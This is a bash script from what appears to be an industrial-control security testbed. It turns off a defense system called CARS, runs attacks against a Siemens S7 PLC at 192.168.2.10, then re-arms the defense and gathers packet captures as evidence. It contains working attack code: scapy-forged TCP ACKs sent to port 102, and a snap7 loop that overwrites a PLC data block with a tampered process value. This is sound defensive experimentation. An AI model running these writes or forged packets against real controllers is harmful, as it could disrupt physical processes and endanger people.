#!/bin/bash
# cars_wire_campaign_disarmed.sh — DISARMED baseline of the wire campaign (the CONTROL for cars_wire_campaign.sh).
# Disarms CARS enforcement + stops remediation, re-runs the vectors (V4 SUSTAINED to show persistence), then RE-ARMS +
# restarts remediation to prove recovery. Shows the raw impact of the attacks when CARS's reactive+process layers are off.
# Usage: sudo bash cars_wire_campaign_disarmed.sh <X-CARS-TOKEN>   (token: cat ~/cars/api_token on Dell#2)
set -u
TOKEN="${1:?need the control token as arg1 (cat ~/cars/api_token on Dell#2)}"
D=/tmp/campaign_disarmed; rm -rf "$D"; mkdir -p "$D"; EV="$D/events.log"
API=http://10.10.10.1:8080; PLCIF=enx9c69d331d874
TS(){ date '+%H:%M:%S.%3N'; }
mark(){ echo "" | tee -a "$EV"; echo "=== [$(TS)] $* ===" | tee -a "$EV"; }
lvl(){ sudo ip netns exec opns python3 -c "import snap7,struct;c=snap7.client.Client();c.connect('192.168.2.10',0,1);print('%.1f'%struct.unpack('>f',bytes(c.db_read(7,0,4)))[0])" 2>/dev/null; }
snap(){ { echo "--- snapshot [$(TS)]: $* ---"
  echo "defense: $(curl -s $API/cars/defense)"
  echo "PLC1 DB7.Level (direct read): $(lvl)"
  echo "remediation_svc: $(systemctl is-active cars-remediation 2>/dev/null)"
  echo "isolate_flows_ovs1(0xca): $(sudo ovs-ofctl -O OpenFlow13 dump-flows ovs1 table=1 | grep -c 'cookie=0xca')"
  echo "audit_tail:"; curl -s $API/cars/audit | python3 -c "import sys,json;[print('   '+l) for l in json.load(sys.stdin)['audit'][-4:]]" 2>/dev/null
  } >> "$EV"; }

mark "DISARM CARS (enforce off) + STOP remediation — creating the no-active-defense baseline"
curl -s -X POST $API/cars/defense -H "X-CARS-Token: $TOKEN" -H 'Content-Type: application/json' -d '{"on":false}' | tee -a "$EV"; echo | tee -a "$EV"
sudo systemctl stop cars-remediation; sleep 1

mark "CAMPAIGN(disarmed) START — captures up"
sudo timeout 200 tcpdump -i "$PLCIF" -nn -U -w "$D/plc1_wire.pcap" 'host 192.168.2.10 and tcp port 102' 2>/dev/null &
sudo timeout 200 tcpdump -i any -nn -U -w "$D/of_control.pcap" 'tcp port 6653' 2>/dev/null &
sudo timeout 200 tcpdump -i snort0 -nn -U -w "$D/dpi_mirror.pcap" 2>/dev/null &
sleep 3; snap "BASELINE (disarmed, remediation stopped)"

mark "V3 STATE manip (disarmed): .2.66 forges out-of-state ACKs to PLC1:102 — structural ct still expected to drop"
sudo ip netns exec atkns python3 -c "from scapy.all import *; send(IP(src='192.168.2.66',dst='192.168.2.10')/TCP(sport=55555,dport=102,flags='A',seq=42),count=8,verbose=0); print('  8 forged ACKs sent')" >> "$EV" 2>&1
sleep 2; snap "AFTER V3 (disarmed)"

mark "V4 OP-AWARE ICS (disarmed, SUSTAINED): .2.31 writes 5.0 to DB7 16x over 8s — NO isolate, NO restore expected"
echo "  (each line = one write+readback; disarmed -> all succeed and level is held tampered)" >> "$EV"
sudo ip netns exec opns python3 -c "
import snap7,struct,time
c=snap7.client.Client()
try: c.connect('192.168.2.10',0,1)
except Exception as e: print('  connect failed:',e); raise SystemExit
ok=0
for i in range(16):
    try:
        c.db_write(7,0,bytearray(struct.pack('>f',5.0)))
        rb=struct.unpack('>f',bytes(c.db_read(7,0,4)))[0]; ok+=1
        print('  t+%.1fs  WRITE 5.0 ok, readback=%.1f'%(i*0.5,rb))
    except Exception as e:
        print('  t+%.1fs  BLOCKED: %s'%(i*0.5,e))
    time.sleep(0.5)
print('  >> successful writes: %d/16 (disarmed=all succeed, attacker never cut)'%ok)
" >> "$EV" 2>&1
snap "AFTER V4 (disarmed — expect level stuck low, isolate_flows=0)"

mark "RECOVERY — RE-ARM CARS + restart remediation"
curl -s -X POST $API/cars/defense -H "X-CARS-Token: $TOKEN" -H 'Content-Type: application/json' -d '{"on":true}' | tee -a "$EV"; echo | tee -a "$EV"
sudo systemctl start cars-remediation; sleep 6
snap "AFTER RE-ARM (expect remediation online + level restored to band)"

mark "CAMPAIGN(disarmed) END — stopping captures"
sleep 2; sudo pkill -f "tcpdump.*campaign_disarmed" 2>/dev/null; sleep 2
sudo chmod 644 "$D"/*.pcap 2>/dev/null
echo; echo "=== EVIDENCE BUNDLE ==="; ls -la "$D"
